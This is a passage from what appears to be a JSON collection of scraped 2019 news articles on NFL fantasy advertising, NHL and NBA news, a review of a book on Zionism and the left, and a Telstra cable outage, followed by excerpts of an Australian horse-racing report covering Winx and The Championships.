market that ensures users \u201cwe\u2019re safe and secure,\u201d he continued. \nWhile Goedde declined to discuss figures, he did say DraftKings\u2019 advertising spend this year was nowhere near the same as in previous years, like when the company reportedly splashed out $131.4 million on television ads between Jan. 1 and Oct. 5 in 2015. \n\u201cThose days were definitely the wild, Wild West; everyone was grabbing territory,\u201d Goedde said. \u201cWe don\u2019t need to just carpet bomb the entire landscape. We\u2019ve built a brand over the last seven years, and we\u2019re a household name now. \u2026 We\u2019ll never need that kind of spend.\u201d \nStill, broadcasting a commercial during the NFL Playoffs guarantees an audience. \nLast year\u2019s NFC championship game between the Los Angeles Rams and the New Orleans Saints pulled in 44 million viewers. The AFC championship matchup between the New England Patriots and the Kansas City Chiefs garnered over 52.9 million viewers. While the season\u2019s not over, each of those four teams remains in the hunt for glory once again. \n\u201cThe NFL is the lifeblood of fantasy sports. Talk to the people in Vegas\u2014it\u2019s the lifeblood of everything that goes on in legalized and illegal gambling,\u201d said Joe Favorito, a sports marketing professor at Columbia University. \nWhen Goedde joined DraftKings in the summer of 2018, one of his first projects was crafting the voice of the brand. Using the late ESPN legend Stuart Scott as the brand\u2019s north star, Goedde and his team ended up picking Burelson, a renaissance man who juggles his own clothing line, an amateur rap career, and hosting duties on the NFL Network\u2019s Good Morning Football and CBS\u2019 Sunday pregame show. This is the second campaign Burelson has worked on for DraftKings, voicing the brand\u2019s opening season campaign this fall.",

      "title": "Stanley Cup Playoffs 2019: Full Schedule, TV Info and Predictions",
      "text": "Nikita Kucherov and the Lightning hope to follow up on a brilliant regular season with a Stanley Cup title. Michael Dwyer/Associated Press \nThe Tampa Bay Lightning have proven beyond a shadow of a doubt that they were the best team in the NHL during the regular season. \nThey closed the regular season the 6-3 victory over the Boston Bruins, their closest rival in the Eastern Conference. It was their 62nd victory of the season, and they ended the year with 128 points, 21 more than the Bruins and the Calgary Flames. \nAs well as the Lightning have played, it won't mean a thing if they don't win the Stanley Cup. There is no doubt about a team that included Nikita Kucherov, Steven Stamkos, Brayden Point, Victor Hedman and Andrei Vasilevskiy, but they still have to prove it during the two-month marathon that is the Stanley Cup playoffs. \nKevin Paul Dupont of the Boston Globe pointed out that 10 teams have had 120 or more points in NHL history, and only four of them have won the Stanley Cup. Those four championships were won by the Montreal Canadiens in the 1970s (1972-73 Habs, as well as '76 through '78 versions). \nAmong the teams that failed were the 1995-96 Detroit Red Wings that put together a 62-13-7 record for 131 points, but lost in the conference finals. The 2005-06 Red Wings, 2009-10 Washington Capitals and the 2015-16 Capitals also shockingly lost early-round playoff series despite their regular season success. \nThe Lightning start the postseason with a matchup against the Columbus Blue Jackets. Columbus, the No. 2 wild-card team in the Eastern Conference, clinched the playoffs Friday night with a shootout victory over the New York Rangers. While there was celebration in the Columbus locker room, the Blue Jackets don't figure to have a long run in the NHL playoffs unless they can pull off one of the biggest shockers in recent NHL history. \nArtemi Panarin, Can Anderson, Matt Duchene, Ryan Dzingel, Seth Jones and Sergei Bobrovsky certainly have talent, but the thought of them winning more than a game against the Lightning seems hard to fathom. If Bobrovsky (2..58 goals-against average, .913 save percentage, 37-24-1 record) plays lights out, a second win may be possible. But that's where it ends. \nThe Blue Jackets finished one point behind the Carolina Hurricanes, who made the playoffs for the first time in 10 years, and that one point is significant. The Hurricanes will face the defending Stanley Cup champion Washington Capitals, a team that finished the regular season with 104 points, 24 fewer than the Lightning. Beating the Caps and Alex Ovechkin won't be easy, but the Hurricanes have a better chance of beating Washington than Columbus does of beating Tampa Bay. \nThe other two Eastern Conference series will see the Bruins meeting the Toronto Maple Leafs for the second straight season, and the surprising New York Islanders taking on Sidney Crosby and the Pittsburgh Penguins. \nThe Bruins beat the Maple Leafs in seven games last year, and another long series seems likely. However, the Maple Leafs stumbled down the stretch and their defense has been inconsistent, while the Bruins were strong after the All-Star game and bypassed the Leafs in February. \nStill, if Toronto can figure out its defensive woes and John Tavares and Auston Matthews are sharp, they could give the Bruins a difficult time. However, Patrice Bergeron, Brad Marchand, David Pastrnak and David Krejci give the Bruins an edge, and Boston also has home-ice advantage. \nThe Islanders were expected to be a mediocre team this season after losing Tavares in the offseason to Toronto, but new head coach Barry Trotz introduced an air-tight defensive system and the Islanders were competitive all season. \nIf Crosby, Evgeni Malkin and Jake Guentzel take the Islanders lightly at all, the Islanders will have an excellent chance to survive and advance. \nThe Flames are the top team in the Western Conference, and they will meet the Colorado Avalanche in the first round. While Calgary is a clear favorite with Johnny Gaudreau (team-high 99 points), Sean Monahan, Elias Lindholm, Matthew Tkachuk and Norris Trophy favorite Mark Giordano (+39 rating), the Avs have the speed and talent with Nathan McKinnon, Mikko Rantanen, Gabriel Landeskog and Carl Soderberg to cause problems. \nIt would not be a shock to see the Avs force this series to six or seven games, and if they push it to the limit, anything could happen in the seventh game. \nThe Nashville Predators beat the Chicago Blackhawks 5-2 in the final game of the season and won the Central Division crown by a point over the Winnipeg Jets and St. Louis Blues. \nThe Preds will meet the No. 1 wild-card Dallas Stars in the first round. Dallas played excellent defense in the second half of the season and surged to a playoff spot behind the play of Tyler Seguin, Alexander Radulov, Jamie Benn and John Klingberg along with goalies Ben Bishop and Anton Khuodobin. The Stars represent a legitimate threat to the Preds, a hot-and-cold team throughout the second half. Viktor Arvidsson, Filip Forsberg and Roman Josi can dominate when the team in on its game, and head coach Peter Laviolette has seen his team go 7-2-1 down the stretch. \nThe Blues and Winnipeg will meet in another first-round series, and the Blues have been dynamic since the early part of January. Winnipeg struggled throughout much of the final month, and St. Louis may have a big edge even though the Jets have home-ice advantage. \nThe last Western Conference series features the San Jose Sharks and the Vegas Golden Knights. Brent Burns, Joe Thornton, Logan Couture and Erik Karlsson will try to lead the Sharks, while Reilly Smith. Jonathan Marchessault and William Karlsson will try to lead the second-year team to the same kind of glory it had last year when it reached the Stanley Cup Final. \nFirst-Round Schedule \nThe NHL released its first-round schedule Sunday morning, and the playoffs will get underway with five games Wednesday and three more Thursday. \nThe Lightning will host Game 1 against Columbus at 7 p.m. ET, and the game will be televised by the USA Network. The Islanders will host the Penguins in another Wednesday matchup at 7:30 p.m. at the Nassau Coliseum, and that game will be broadcast by NBCSN. \nThe Central Division champion Predators will host the Stars in Game 1 Wednesday at 9:30 p.m. on USA, and the Jets will host the Blues Wednesday at 8 p.m. on the NHL Network. The last of the Wednesday opening-round games will see the Sharks host the Golden Knights at 10:30 p.m. on NBCSN. \nThe Bruins will host the Maple Leafs in Game 1 of that Eastern Conference series Thursday at 7 p.m. ET on NBCSN. The Caps and Hurricanes will meet in Washington Thursday at 7:30 p.m. on USA, and the Flames will host the Avalanche at 10 p.m. in the last of the Thursday series openers on NBCSN. \nHere's the link to the full first-round schedule , per NHL.com \nPredictions \nEastern Conference \nTampa Bay over Columbus, 4-1. Lightning too powerful, efficient and determined. \nBoston over Toronto, 4-1. Maple Leafs have slipped defensively. Only hope is to outscore savvy Bruins. \nWashington over Carolina, 4-2. Storm Surge wins a couple of games at home, but Caps survive and advance. \nPittsburgh over N.Y. Islanders, 4-3. Crosby makes the difference in Game 7. \nWestern Conference \nColorado over Calgary, 4-3. NHL is more likely to feature a 1-8 upset than NBA, and speedy Avs pull off surprise this year. \nDallas over Nashville, 4-2. Not a shocker with the way the second half of the season has gone. \nSt. Louis over Winnipeg, 4-1. Jets have lost their mojo while Blues are as hot as any Western Conference team in the league since January. \nVegas over San Jose, 4-3. Golden Knights have the scoring depth and the confidence to win first-round matchup.",

      "title": "From Ohio State To The Redskins: Dwayne Haskins\u2019 Rivalries Are Different But He\u2019s The Same",
      "text": "In college, teams rarely play each other twice in one season. So the closest quarterback Dwayne Haskins came to a repeated rivalry at Ohio State is, of course, when the Buckeyes play Michigan once a season every November. That year-long build-up and suspense disappears in the NFL when teams play their division counterparts twice throughout the regular season like the Redskins will do for the second time Sunday when they host the New York Giants. \n\u201cThe good thing about being in the NFC East is you get to play them twice,\u201d Haskins said. \u201cJust watching film from that game to now, just how cleaner my progressions and eyes are. Just getting better every week, so I\u2019m excited.\u201d \nThe matchup between the Redskins and Giants, the NFC East\u2019s worst teams in the NFL\u2019s worst conference, hardly compares to The Game between the Big Ten\u2019s top teams. But there are similarities between Haskins\u2019 first game against Michigan and his first matchup versus the Giants that are worth noting because the comparison offers insight into Haskins\u2019 potential growth and development in the NFL. \nWhen Haskins made his debut versus Michigan, he replaced starter J.T. Barrett in the third quarter and finished 6-for-7 for 94 yards and no sacks and he also rushed for 24 yards on three attempts. Ohio State would go on to defeat the Wolverines in Ann Arbor, 31-20. \n\u201cIt was unreal,\u201d Haskins said to reporters after the game. \nIn Haskins\u2019 first matchup against the Giants, he replaced starter Case Keenum midway through the second quarter. Haskins completed 9-of-17 passes for 107 yards, three interceptions and two sacks. The Redskins lost the game, 24-3 at MetLife Stadium in the Meadowlands. \nThough some of the circumstances are the same - Haskins replaced the starter, he was not playing on his home field - the outcomes of the two games were very different and so was Haskins reaction to his performance. \n\"I throw up watching that [Giants] film,\" Haskins said on Wednesday . \"I don't like watching that tape. That's a totally different guy.\" \nThe performance earned Haskins a benching over the next four games until interim head coach Bill Callahan decided to start him Week 9 against the Buffalo Bills. \n\u201cI don\u2019t want to talk about it,\u201d Haskins added. \u201cIt\u2019s done with, next game. Looking forward to play them at home.\u201d \nHaskins proved he has the ability to learn from past mistakes back in college though when he played Michigan for the second time during his sophomore year, this time as the starter. He was a \u201ctotally different guy.\u201d He was better. \nHaskins completed 20-of-31 passes that day in Columbus, for 396 yards and six touchdowns. No.10 Ohio State dominated No. 4 Michigan, 62-39. Haskins passed the previous record of 39 touchdowns in a season, held by Drew Brees, and 3,985 passing yards, held by Curtis Painter. During the game, Haskins also tied the quarterback that he once replaced, Barrett, with his eighth-career 300-yard passing game - all of which came during the 2018 season. \nIf Haskins\u2019 past provides any insight into his future, perhaps Redskins fans can expect a different quarterback to be guiding his team at FedEx Field on Sunday against the Giants just like he led the Buckeyes to a statement win in 2018. \n\u201cThat\u2019s just something that I feel watching that tape, that\u2019s not me and it wasn\u2019t me out there,\u201d Haskins said about his Week 4 performance versus the Giants. \u201cYou just want to look at it and be like, \u2018This is what I messed up on,\u2019 and move on from it. I don\u2019t mind watching it, I just prefer to watch something else.\u201d \n\u201cThe more I play, being able to know where the check-downs are when pockets break down and know where I\u2019m going to get rid of the ball when they bring something and we didn\u2019t pick it up,\u201d Haskins said. \u201cJust playing better situational football.\u201d \nAnd the numbers prove that experience is paying off for Haskins. Last Sunday against the Philadelphia Eagles, he went 19-of-28 for 261 yards, two touchdowns and no interceptions in his best game of the year. Haskins\u2019 numbers added up to a QB rating of 121.3 compared to the 32.8 rating he posted versus the Giants in Week 4. \n\"I think he's doing a terrific job,\" Giants head coach Pat Shurmur said. \"I think he's doing a nice job delivering the ball quickly. We knew when he came out he was a very talented, very accomplished player. And I think he's making good progress.\" \nInterim head coach Bill Callahan has also seen growth in Haskins over the course of the season. \n\u201cHis overall preparation, his mental aspects of the game have really, really improved,\u201d Callahan said. \u201cThe physical traits have been there and they\u2019re starting to come out, they\u2019re being developed a little more fully than they were in the game against the Giants the first time. He\u2019s a tough-minded kid, he\u2019s competitive, he's trying to get a system down that he hasn\u2019t been familiar with, but he\u2019s done a pretty good job with handling all the stress and all the pressure that comes with it.\u201d \nIf the determining factor for Haskins this Sunday is about pressure, then there should be no cause for concern. Haskins came back the second time against Michigan to not only win, but dominate. \nThe rivalries are different in scope, but Haskins is the same. So if Haskins approaches this second matchup against the Giants the same way he attacked Michigan in college as a starter, then the Redskins have nothing to worry about.",

      "title": "Romeo Langford Declares for 2019 NBA Draft",
      "text": "AJ Mast/Associated Press \nIndiana Hoosiers freshman guard Romeo Langford declared for the 2019 NBA draft on Thursday, according to ESPN's College Gameday : \nCollege GameDay @CollegeGameDay \nBreaking: Indiana freshman Romeo Langford (No. 11 ESPN 100) tells ESPN he will declare for the 2019 NBA Draft. https://t.co/BKH6kAhrWp \nLangford had a solid freshman season, averaging 16.5 points and 5.4 rebounds per game, though the Hoosiers in general struggled to a 19-16 record, failing to reach the NCAA tournament. He also struggled with a torn ligament in his hand throughout the year. \n\"I think it's fair to say that we never got a chance to see me at my best at the college level, especially since I've been playing with basically a cast on my thumb the whole season,\" Langford said, per Jonathan Givony of ESPN.com . \"Obviously that throws off your shot. Even though I didn't shoot as well as I'm capable of, I feel like I shot the ball pretty well in the second half of the season.\" \nJonathan Givony @DraftExpress \nSome highlights from Romeo Langford's freshman season. Was named second team All-Big 10 and made the conference's All-Freshman team. Will be interesting to see how he looks in workouts once he's back at full strength. https://t.co/KvaTRu9fWv \nLangford has ideal size and length to play on the wing at the NBA level, and he proved he can get buckets at the college level. \nThere are questions about the consistency on his jump shot, however, and like many college players, his defense will need to improve at the professional level. He also seems to split opinion when it comes to his NBA prospects. \n\"He's got this funky deal where he brings the ball over his head on his jump shot with a hard wrist action,\" one college coach told Sam Vecenie of The Athletic in late February. \"I don't believe in him as a shooter at all. I think he's going to have to change it altogether.\" \nThat same coach added: \"He's good, but I don't think he's this freakish, freakish athlete. His handle isn't super tight. His playmaking isn't there. His shot is obviously wildly inconsistent. I don't know. I'm sure he'll be a top-15 guy, but I'm not sure he's going to be someone that right away is ready to do it.\" \nAnother coach was much higher on Langford, however: \n\"He's fast. He's got such a great burst. He's great in transition. He can get to the rim at will. He's very, very strong for a kid that age. He just has a knack for scoring the ball. We had some guys on the wing that we thought were pretty physical, and he got wherever he wanted. When his shooting comes, he'll be really good. Great athlete, very strong. Able to get to his spots on the floor very easily.\" \nPlayers with Langford's physical profile and ability to get to the rim warrant patience at the NBA level. \nHe has the talent to be an excellent two-way wing, especially if he irons out the kinks in his jumper. Even if he never becomes an elite shooter, he could have very nice value as a slashing, athletic wing. \nIf he doesn't improve his jumper or his defense, however, Langford could struggle to make his mark at the next level. But given his potential\u2014and the fact that he was battling an injury in the 2018-19 season that might have altered his shot\u2014he's expected to be a lottery pick.",

      "title": "Nonfiction: How the Great Leftist Thinkers of the 20th Century Contended With Zionism",
      "text": "THE LIONS\u2019 DEN \nZionism and the Left From Hannah Arendt to Noam Chomsky \nBy Susie Linfield \nAs discouraging as these times may be for fans of liberal democracy, the mood among liberal friends of Israel \u2014 including most American Jews \u2014 is more like severe heartbreak. Look one way and there\u2019s Israel\u2019s right wing carousing with European despots and Holocaust deniers while fanning racism at home. Look the other way and see the cream of the intersectional left cavorting with the reactionary bigot Louis Farrakhan while young rock-star progressives in Congress set about rebranding the Jewish state from ally into enemy and its supporters \u2014 meaning, again, most American Jews \u2014 into traitors. \nLong gone are the days when Israel was new and appealed to idealists around the world, when Golda Meir was a celebrated deputy chairwoman of the Socialist International and Pete Seeger and the Weavers were singing the Israeli folk tune \u201cTzena, Tzena, Tzena\u201d on the \u201cHit Parade.\u201d \nHow has it come to this? That is the central question Susie Linfield poses in her new book, \u201cThe Lions\u2019 Den: Zionism and the Left From Hannah Arendt to Noam Chomsky.\u201d \nHow, she asks, did the state of Israel, which \u201ccame out of, and was nurtured by, the left,\u201d become anathema to that same left? How did \u201cZionist,\u201d the name for participants in and sympathizers with the Jewish state-building effort, \u201cbecome the dirtiest word to the international left \u2014 akin, say, to \u2018racist,\u2019 \u2018pedophile\u2019 or \u2018rapist\u2019?\u201d \nOn the flip side, how did Israel \u201ccome to deny the national rights of a neighboring people and to violently suppress them \u2014 not for a year or two, but for over a half century?\u201d \nImportant questions, and achingly timely. Strangely, \u201cThe Lions\u2019 Den\u201d does not really address them. The book is described in Linfield\u2019s introduction, in the jacket copy and promotional material as an \u201cintellectual history\u201d tracing the evolution of left-wing thought that brought us from there to here, from, say, Pete Seeger to Ilhan Omar. But the actual book, the one sandwiched in between \u201cIntroduction\u201d and \u201cConclusion,\u201d is something quite different. It is, in fact, something more original, more interesting and probably more important than a standard intellectual history would have been. Why the book so misrepresents itself remains a mystery. \nThe heart of \u201cThe Lions\u2019 Den\u201d is a series of individual portraits of iconic, midcentury left-wing thinkers who wrote extensively on the idea and reality of Jewish statehood. Six of the eight share overlapping biographies and experiences, which makes their very different intellectual journeys through the same historical thicket both instructive to today\u2019s searchers and relevant to today\u2019s crises. \nThe other two, Noam Chomsky and the British journalist Fred Halliday, seem quite out of place here, yet another oddity in this volume. Both entered the arena in a later era, making their stories irrelevant to the book\u2019s drama, and neither of them \u2014 the very Jewish Chomsky or the non-Jewish Halliday \u2014 participates visibly in the others\u2019 intensely personal struggles with Jewish identity. \nImage \nThe six overlapping profiles, on the other hand, tell such an intriguing story that the book\u2019s marginal oddities fade in importance. Here they are: the German-born political philosopher Hannah Arendt; the mercurial, Hungarian-born novelist and adventurer Arthur Koestler; the great biographer and Trotsky admirer Isaac Deutscher; the combative American journalist I. F. Stone; the French Arabist journalist Maxime Rodinson; and the Tunisian-French anticolonialist philosopher Albert Memmi. \nAll six lived through, wrote about and were shaped by the cataclysmic events of the mid-20th century: the rise of fascism, the Moscow show trials, World War II and the Holocaust, Israel\u2019s independence and, significantly, the 1967 Six-Day War. All considered themselves socialists, some episodically, most as a lifelong identifier. \nAll six were Jewish. All wrote urgently and at length about the Jewish history that was unfolding before their eyes. All wrote about the place of the Jew in the modern world, some dismissively, most with sympathy, all beneath the shadow of the Nazi genocide that was engulfing Europe and their own families. \nThe six were all independent, unconventional thinkers who often found themselves alone and at odds with their own peers and allies. All produced ideas and phrases that have entered our moral vocabulary, most notably Arendt\u2019s \u201cbanality of evil.\u201d \nImage \nAnd, of course, all six dealt repeatedly and at great length with the question of Jewish statehood, or Zionism. Only two retained their views over time, the lifelong anti-Zionist Rodinson and the lifelong pro-Zionist Memmi. The other four changed positions as history changed, some from pro-Zionist to anti-, others the reverse and some repeatedly back and forth. Koestler, the champion change artist of the group, became a communist in his teens, then joined Vladimir Jabotinsky\u2019s right-wing Zionist Revisionist movement, forerunner of today\u2019s Likud, then returned to communism, then emerged as one of the world\u2019s most influential anticommunists and returned to Revisionism. \nArendt, the most famous and influential of the six, was converted to Zionism by Hitler\u2019s takeover in 1933. Fleeing across Europe, twice escaping Nazi detention, she landed in New York in 1941 and began her long writing career. Initially a militant Zionist, she became less attached after Israeli independence in 1948, suspicious of nation-states and their abuses of power. Her book \u201cThe Origins of Totalitarianism\u201d in 1951 established her worldwide reputation as a political philosopher. All of her contradictions came together in 1961 when she covered the Eichmann trial for The New Yorker, describing it as a \u201cshow trial\u201d rather than a judicial exercise. Her version remains controversial to this day. \nOther profiles are no less dramatic. Deutscher, a Talmud prodigy during his childhood in a Polish shtetl, went on to become a translator of Hebrew and Yiddish poetry, then a communist, then a follower of Leon Trotsky\u2019s heterodox communism and finally a globe-trotting British journalist. He abandoned his doctrinaire anti-Zionism following the Holocaust, was charmed during a 1954 visit by Israel\u2019s revived Hebrew culture and kibbutz socialism, then turned bitterly hostile following Israel\u2019s six-day victory in June 1967, even somehow forgetting his Hebrew and Yiddish. He died that August, unreconciled. I. F. Stone, the fabled Washington journalist, underwent a nearly identical reversal in 1967. Linfield claims uncertainty about how large a role the 1967 war and occupation play in leftists\u2019 antagonism toward Israel. But these individual stories suggest that the legacy of 1967 cannot be overstated. \nLinfield is an associate professor of journalism at New York University and her writing combines the storytelling of a journalist with a scholar\u2019s analysis of ideas. She repeatedly jumps in and argues with her subjects, point by point, giving each chapter the feel at times of a \u201cMeet the Press\u201d-type interview occurring across time. \nIf the book has one problem it\u2019s Linfield\u2019s inability to recognize the significance of the document that she herself has produced. She tries to present it, particularly in her tacked-on introduction and conclusion, as foreshadowing and illuminating the tragic deadlock in Israeli-Palestinian coexistence. To be blunt, it doesn\u2019t work. \nIn fact, its success is in foreshadowing and illuminating a different conflict that has been simmering under the surface for a decade and has exploded into the headlines just in the early months of this year. \u201cThe Lions\u2019 Den\u201d illustrates the individual struggles of Jewish leftists in the World War II generation to reconcile their conflicting impulses, the particularist pull of Zionism and the universalist pull of socialism. Their stories precisely anticipate the tension today\u2019s Jewish liberals experience trying to reconcile their own pro-Israel particularism and their social-justice universalism. \nLinfield could not have foreseen, even a year ago as she was writing, the current predicament of Democrats caught between support of Israel and sympathy for the Palestinians, or \u2014 dare we say it? \u2014 between the affections of America\u2019s well-established Jewish community and fast-rising Muslim community. Unexpectedly, her book appears just as its stories and lessons become urgent.",

      "text": "Telstra is rushing to replace 200m of cable damaged by a third party in Sydney on April 3 rd . \nNew details of the issue have emerged. \nFor starters, the incident involves two cables, not one! \nSecondly, and despite CRN\u2019s previous correspondence with Telstra mentioning a cut in Chatswood, the carrier has now told us the cut is in the Sydney suburb of Ermington (which has a Victoria Road, hence the confusion with Chatswood\u2019s Victoria Avenue). \nTelstra told us that \u201cComplete restoration to the services on the first damaged cable was completed today [Friday, April 5 th ] at 12.15PM Eastern Standard Time.\u201d \nThat fix means all bar 30 customers have voice and data connections again. \nBut the second cable is a bigger job. Telstra told us that its \u201cwork crews are currently replacing approximately 200 metres of cable to resolve this issue.\u201d \nThe scale of that effort means the carrier told CRN \u201cAn estimated completion time is not known at this time but Telstra will be working as quickly as possible to progressively restore services to these affected customers.\u201d \nIt is unclear why Telstra needs to replace 200 metres of cable, but the fact such a substantial replacement is needed suggests the damage is so significant that permit splicing alone won\u2019t suffice. \nNor has any information emerged regarding the identity of whoever managed to damage the cable. CRN understands roadworks were a factor in the incident and that it won\u2019t be long before sternly-worded letters about the situation reach those responsible.",

It was vintage Winx, cruising to the front early in the straight and putting the result beyond doubt, although Japanese import Kluger didn't shirk the task, sticking on gamely to finish just 1 1/2 lengths off the champion. Winx's regular sparring partners over the years, Hartnell and Happy Clapper, finished third and fourth respectively. \nWhile it all went to plan on the track, as the vision shows below, it wasn't a perfect celebration for Bowman post-race. \nREAD: Bowman bloodied by Winx headbutt \nDid anyone just see Winx headbutt Bowman and split him?! \ud83d\ude02 #GoWinx pic.twitter.com/A9RO8oOm2q \n\u2014 Brad Eveleigh (@Brad_Eveleigh) April 13, 2019 \nREAD: Queen Elizabeth Stakes: What the jockeys said \nVerry Elleegant claims ATC Oaks \nThe racing manners that held back Verry Elleegant ($2) in the spring appear to be a thing of the past as the talented filly landed her first G1 victory in the ATC Oaks. Her maturation in her first preparation with Chris Waller has been on display at her past two starts, settling well in the run, allowing her to show her turn of foot in the straight. The pace was slack early in the Oaks, which saw Bowman make a mid-race move aboard Frankely Awesome to take up the running. The Lees-trained filly gave a good sight, pinching a break of 1L on the field at the 200m, but Verry Elleegant was quickly on the scene, flashing down the outside of the field. In the end she held a margin of 1.8L over Scarlet Dream, with the runner-up relishing the step-up to 2400m. Frankely Awesome couldn't go with the pair over the final furlong, finishing a further 2.5L back in third. \nRACE REPLAY \u2013 RANDWICK RACE 6 \nWhat an outstanding win by Verry Elleegant in the Australia n Oaks! @royalrandwick . pic.twitter.com/2Io9maeFKv \n\u2014 Sky Racing (@SkyRacingAU) April 13, 2019 \nShraaoh gives Waller another G1 \nImport Shraaoh made it three G1s on the card for trainer Chris Waller - on the same day he brought up his 100th G1 success - by outstaying his rivals over two miles in the Sydney Cup. Shraaoh had been thereabouts at his past three runs this campaign, but kept finding one or two better. The rise to two miles proved to be what was required for the Irish gelding. Aided by a flawless ride by Jay Ford, Shraaoh was able to hold Vengeur Masque at bay by 0.4L with Kiwi mare Glory Days 1.5L away in 3rd. For Ford, it was his first success at the top level since Monaco Consul's Spring Champion Stakes victory in 2009. \n\"I used to ride a very good horse (Takeover Target) and then he disappeared and things have been up and down since then,\" Ford said. \"I'm just happy to prove to myself, more than anything, that I can still compete and get the job done and I had a wonderful horse underneath me to help me.\" \nShraaoh wins the @SchweppesAus Sydney Cup. 101 G1 wins and 3 in a row for @cwallerracing #theraces pic.twitter.com/4yKbqcuWpO \n\u2014 Australian Turf Club (@atc_races) April 13, 2019 \nFavourite Dubhe disappointed back in 12th, with Kerrin McEvoy stating his mount never really travelled in the run. \n\" \nHe was sluggish out of the gates.

The 5YO mare burst through a gap at the 150m with John Allen in the saddle and the winner of the G2 Matriarch Stakes during the spring was simply the strongest at the end of the Randwick mile. Just 0.4L separated the first four across the line with the retiring Dixie Blossoms in 2nd, just ahead of Unforgotten and Miss Siska. \nFall mars the opener \nIt wasn't a good start to day two of The Championships with a dramatic fall involving Glyn Schofield and Andrew Adkins taking place inside the final 50m of the Kings Of Sydney Sport Mile (1600m). Schofield was able to walk away from the incident and was given the all-clear to continue riding at the meeting. Adkins was taken to hospital for further observation and was found to have suffered an undisplaced fracture of his T3 Vertebra. The good news from Racing NSW's Dr Duckworth was the fact he would not reuire surgery. As of Saturday afternoon, Adkins was still awaiting results from scans of his face. Both horses involved, Persan and War Baron, came through unscathed. Mark Zahra claimed the race aboard Power Scheme, but it came at a hefty price. He was suspended for 25 meetings and fined $3800, with stewards deeming he caused interference which led to the falls when he allowed his mount to shift out near the 100m. \nREAD: Mark Zahra handed hefty suspension, fine \nGlyn Schofield showed concern for fellow rider Andrew Adkins following their falls.

Classique Legend is owned by Hong Kong interests, but the hope is that rich races on offer in Australia, especially during the spring with events like The Everest and the Golden Eagle, could keep the rising star in Australia. Having been luckless last start in the Darby Munro, McEvoy rode the gelding more conservatively this time, settling midfield with cover. He sprinted quickly in the straight, hitting the lead at the 200m and going on to win by 1.3L. Jonker turned his form around back on a better surface to hold down 2nd with Kiwi filly Avantage in 3rd. \n@inglis_sales @KPMcEvoy @ArrowfieldStud What can I say about this dude, on 1 preparation-1 jump-out, 1 Barrier Trail, 2 wins, a third & today salutes dominantly, in the G2 Arrowfield Sprint, stamping himself as a horse of the future all class #Classique Legend, a star #Legend pic.twitter.com/piyJFSRFzB \n\u2014 Carmel...size (@carmelsize) April 13, 2019 \nAnaheed holds out flying Flit \nAnaheed ($8.50) picked up her second victory at Group Two level for the preparation with a narrow win in the Percy Sykes Stakes (1400m). The Snowden-trained filly denied Godolphin another 2YO victory, holding off Flit by a nose. Flit was last in the field of 10 at the 300m before unleashing a strong run down the outside, but the line arrived a fraction too early for her. Favourite Cheer Leader led them up before weakening over the final 250m, finishing back in 6th.

The daughter of So You Think settled just off leader Green Aeon in the run before taking over at the 300m. She was able to hold off a wall of challengers in a bunched finish to the 1400m race. However, it was a hard luck story for another previously unbeaten runner, with Millard Reaction a good thing beaten. Sam Clipperton was unable to find clear galloping on the Toby Edmonds-trained gelding at the 100m when attempting to take a split between Green Aeon and the eventual winner. \nTough win! \ud83d\udcaa \nFasika hits the front at the 200m and knuckles down to hold off her rivals as the @PrideRacing filly makes it three in a row in the South Pacific Classic. pic.twitter.com/Z9RReanolY \n\u2014 TAB (@tabcomau) April 13, 2019 \nBobbing bobs up in Provincial Final \nLightly-raced 5YO Bobbing ($7.50) notched up his fifth win from just his 10th career start with victory in the Provincial Championships Final. Trained by Bernie Kelly at Hawkesbury, Bobbing came from second last turning for home to claim the $500,000 final defeating Spring Charlie by half-a-length with Chalmers a further head away in 3rd. Jockey Koby Jennings said he was confident heading into the race. \n\u201cI knew he was going to be good enough to win this. I actually started to get a bit nervous and I don\u2019t usually get nervous,\" Jennings said. \nThe provincial races have proven a goldmine for Bobbing, who took out the $150,000 Spring Series Final over a mile back in December. Easing favourite Archedemus finished 2L off the winner back in 8th and while the Markwell-trained gelding was held-up at the 200m, he failed to charge through the line once clear. \nBobbing for Bernie Kelly and Koby Jennings is the 2019 Polytrack Provincial Championships winner! pic.twitter.com/rABotp5BQ3 \n\u2014 The Cha\u24c2\ufe0fpionships (@ChampionshipsRR) April 13, 2019 \nCAULFIELD \nStar Performer II: Super Seth \nObviously the mighty mare Winx picks up the official 'Star Performer' for the day but there were a couple of outstanding performances in Melbourne - the first coming in the opening event. The Freedman-trained Super Seth was crunched in betting on the back of a dominant debut victory, jumping at the prohibitive odds of $1.70 after as much as $2.80 was offered. The Dundeel colt was snagged right back to the tail early and was still near-last passing the 400m, with plenty of rump in front of him. Thankfully for favourite-backers, jockey Clayton Douglas was able to work Super Seth into the clear and the promising two-year-old did the rest - motoring home to score in brilliant fashion. \nA stunning win by Super Seth! Second last on the turn but a patient ride from Clayton Douglas got him into space and he hit the line with gusto. \ud83d\udca8\ud83d\udca8 pic.twitter.com/73uVPVml6o \n\u2014 Racing.com (@Racing) April 13, 2019 \nSuper Seth could press on to the Brisbane carnival for races such as the Sires' Produce Stakes and G1 J J Atkins Stakes. The Listed Anzac Day Stakes (1400m) at Flemington on April 25 is another option, as is heading for a spell. \nREAD: Super Seth impresses in Caulfield victory \nStar Performer III: Tarwin \nMick Kent has a very talented conveyance on his hands in the form of Americain gelding Tarwin. The three-year-old atoned for an unlucky second at Sandown Hillside first-up with a superb swooping win in the sixth - the LU Simon Builders Handicap (1440m). Last upon settling down and still at least 7L off the leader at the 400m, Lachy King steered Tarwin to the middle of the track and the $5 second-favourite left his rivals standing with a blistering turn-of-foot, breaking 11 seconds for his final furlong (10.90 seconds). \nGiven it was just his third career start and he's bred to get over 1600m+, it's fair to say there is plenty of improvement to come. \nHow impressive was that from Tarwin?

In what was a running double for apprentice Michael Poy after Truly Discreet's victory in the third, the Anthony Freedman-trained gelding always travelled sweetly before careering away in the straight to score by 3.75L. \nCompetent ride by apprentice Michael Poy gets the hot favourite Steel Prince home at Caulfield. pic.twitter.com/nhcrSFHqX2 \n\u2014 Racing.com (@Racing) April 13, 2019 \nThe Andrew Ramsden, held on May 25, carries ballot exemption for the Melbourne Cup but Freedman certainly isn't getting ahead of himself. \n\"These European horses, I think the more you run them the more dour they get. But he would also have to improve. He had no weight today and these aren't Ramsden horses,\" Freedman said. \nUpset result in the feature \nPunters climbed into Eduardo ($2.30 into $2) in the Listed Bel Esprit Stakes (1100m) but the even-money favourite disappointed in what was a far cry from his much-heralded performance in the G1 Oakleigh Plate over the same route. On paper, there looked to be a stack of speed in the event but Bowditch was able to cruise across quite comfortably on Miss Leonidas from barrier nine, leading at steady fractions. Eduardo threatened at the top of the straight but his challenge was short-lived, with the early pacesetter 